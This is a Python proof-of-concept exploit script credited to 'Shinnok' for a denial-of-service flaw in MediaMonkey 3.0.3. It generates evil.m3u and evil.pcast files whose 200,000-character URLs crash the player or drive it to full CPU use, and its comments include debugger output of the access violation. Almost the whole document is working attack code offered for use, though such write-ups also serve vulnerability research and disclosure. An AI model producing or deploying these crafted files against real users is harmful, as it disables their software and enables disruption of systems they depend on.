#!/usr/bin/python
# MediaMonkey 3.0.3 [.m3u] & [.pcast] url handling DOS
#This script will generate 2 files called evil.m3u and evil.pcast.
#In both cases the vulnerability resides in failure to handle overly long urls.
#[.m3u descr]
#The vulnerability exists in several places within the url.In this case
#we are going to use the file name part of the url.
#Open evil.m3u in MediaMonkey then play it.Or double click the .m3u file
#and it will try to play automatically.
#Debugger output on crash:
#              ----------------------------------------------------------------
#              Exception C0000005 (ACCESS_VIOLATION reading [31F518F0])
#              ----------------------------------------------------------------
#              EAX=FFFFFFFF: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
#              EBX=00000002: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
#              ECX=0CF203D9: 2F 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
#              EDX=0CF203D9: 2F 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
#              ESP=0CC5AF38: 31 32 37 2E 30 2E 30 2E-31 2F 41 41 41 41 41 41
#              EBP=0CCBFF7C: B4 FF CB 0C 18 63 54 03-B8 49 55 03 08 3F 5B 03
#              ESI=25031517: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
#              EDI=0CCBFF5D: 03 F2 0C D9 03 F2 0C 26-00 00 00 48 00 F1 0C 78
#              EIP=035445A8: 8A 14 0E 8D 04 0E 80 FA-2F 0F 84 13 01 00 00 80
#                            --> MOV DL,[ESI+ECX*1]
#              ----------------------------------------------------------------
#
#[.pcast descr]
#Just as in the .m3u case the vulnerability manifests in several places within
#the url.In this case we will use the filename too.
#Double click or "open with" evil.pcast in MediaMonkey.The program will 
#start consuming 100% cpu thus becaming unusable.
#
#Found by Shinnok
m3u = 'http://127.0.0.1/'
badstr = 'A' * 200000
m3u += badstr
m3u += '.mp3'

f = open('evil.m3u','wb')
f.write(m3u);
f.close

pcast = '<?xml version="1.0" encoding="UTF-8"?>\n<pcast version="1.0">\n<channel>\n<link rel="feed" type=\
"application/rss+xml" href="http://127.0.0.1/'
badstr = 'A'* 200000
pcast += badstr
pcast += '.xml"/></link>\n</channel>\n</pcast>\n'

f = open('evil.pcast','wb')
f.write(pcast);
f.close

